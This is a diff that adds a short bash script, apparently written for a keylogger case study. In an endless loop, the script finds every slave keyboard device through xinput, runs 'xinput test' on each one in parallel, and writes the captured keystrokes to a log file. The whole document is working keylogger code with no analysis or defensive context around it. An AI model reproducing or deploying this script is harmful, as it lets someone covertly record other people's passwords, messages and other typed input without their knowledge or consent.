@@ -1,0 +1,6 @@
+#!/bin/bash
+while true; do
+xinput list |
+  grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' |
+  xargs -P0 -n1 xinput test > /home/ixa/intrigue/casestudy/test_keylogger/bash_log
+done
